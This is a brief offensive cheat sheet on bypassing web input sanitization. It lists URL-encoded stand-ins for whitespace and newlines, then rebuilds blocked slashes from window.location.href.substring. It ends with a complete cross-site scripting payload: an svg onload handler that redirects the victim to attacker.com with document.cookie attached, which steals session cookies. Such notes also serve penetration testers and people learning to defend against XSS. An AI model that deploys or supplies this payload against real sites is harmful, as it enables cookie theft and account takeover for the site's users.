# Sanitization
## Bypassing Sanitization
1. **Encoding**
URL encode sanitized characters:
```
*whitespace* -> %0C
*new line* -> %0D
... etc
```
2. **JS function**
if forward slashes(`/`) are being sanitized:
```js
window.location.href.substring()
```
```
http://address.com/?name=
<svg%0Conload=window.location=(window.location.href.substring(0, 7)%2b"attacker.com"%2bwindow.location.href.substring(5,6)%2b"cookies"%2bwindow.location.href.substring(5,6)%2bdocument.cookie)>
```